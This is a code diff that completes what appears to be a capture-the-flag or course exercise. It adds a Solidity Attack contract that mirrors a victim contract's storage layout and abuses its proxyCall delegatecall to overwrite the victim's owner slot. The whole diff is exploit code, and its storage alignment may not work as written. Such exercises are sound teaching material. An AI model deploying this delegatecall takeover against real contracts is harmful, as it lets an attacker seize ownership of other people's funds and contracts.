@@ -7,19 +7,39 @@ interface ID31eg4t3 {
 }
 
 contract Attack {
+    uint256 var0;
+    uint8 var1;
+    string private var2;
+    address private var3;
+    uint8 private var4;
+    address public owner;
+    mapping(address => bool) public result; 
     address internal immutable victim;
-    // TODO: Declare some variable here
-    // Note: Checkout the storage layout in victim contract
+    address public newOwner;
 
-    constructor(address addr) payable {
-        victim = addr;
+    constructor(address _victim) {
+        victim = _victim;
+        var0 = 12345;
+        var1 = 32;
+        var2 = ""; 
+        var3 = address(0);
+        var4 = 0;
+        owner = msg.sender; 
     }
 
-    // NOTE: You might need some malicious function here
+    function maliciousFunction() external {
+        owner = newOwner;
+    }
 
     function exploit() external {
-        // TODO: Add your implementation here
-        // Note: Make sure you know how delegatecall works
-        // bytes memory data = ...
+        newOwner = msg.sender;
+
+        bytes4 selector = bytes4(keccak256("maliciousFunction()"));
+        bytes memory data = abi.encodeWithSelector(selector);
+
+        (bool success,) = victim.call(
+            abi.encodeWithSelector(ID31eg4t3.proxyCall.selector, data)
+        );
+        require(success, "Delegatecall failed");
     }
 }
